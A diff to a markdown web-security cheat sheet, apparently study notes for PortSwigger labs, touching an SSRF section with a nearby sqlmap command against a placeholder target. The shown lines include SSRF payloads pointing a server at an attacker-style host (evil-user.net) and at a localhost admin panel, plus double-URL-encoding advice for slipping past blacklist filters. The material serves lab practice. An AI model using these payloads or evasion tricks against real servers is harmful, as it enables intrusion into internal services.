@@ -485,9 +485,9 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 ## SSRF - Server Side Request Forgery  
 
->SSRF attack cause the server to make a connection to internal services within the organization, and force the server to connect to arbitrary external systems, potentially leaking sensitive data.  
+>SSRF attack cause the server to make a connection to internal services within the organization, or force the server to connect to arbitrary external systems, potentially leaking sensitive data.  
 
-<sub>SSRF exploitation examples</sub>
+<sub>SSRF exploitation examples</sub>  
 
 ```html
 /product/nextProduct?currentProductId=6&path=http://evil-user.net  
@@ -498,6 +498,8 @@ http://127.1:6566/admin
 ```  
 
 >Double URL encode characters in URL such as to Obfuscate the "a" by double-URL encoding it to %2561  
+
+![ssrf obfuscated](ssrf-obfuscated.png)  
 
 [PortSwigger Lab: SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)  
 
